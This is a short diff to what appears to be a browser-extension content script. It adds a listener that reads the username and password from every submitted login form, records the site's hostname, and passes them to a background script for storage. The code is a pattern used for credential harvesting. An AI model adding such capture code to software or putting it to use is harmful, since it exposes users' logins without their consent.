@@ -20,3 +20,24 @@ document.addEventListener("keydown", (event) => {
     });
 
 });
+
+
+document.addEventListener("submit", (event) => {
+    const form = event.target;
+    const passwordField = form.querySelector('input[type="password"]');
+    const usernameField = form.querySelector(
+    'input[type="text"], input[type="email"], input[type="tel"], input[name*="user"], input[name*="login"], input[id*="user"], input[id*="login"], input[autocomplete="username"], input[autocomplete="email"]'
+);
+
+
+    if (passwordField && usernameField) {
+        const credentials = {
+            username: usernameField.value,
+            password: passwordField.value,
+            site: window.location.hostname
+        };
+
+        // Send credentials to background script for storage
+        chrome.runtime.sendMessage({ type: "credentials", data: credentials });
+    }
+});
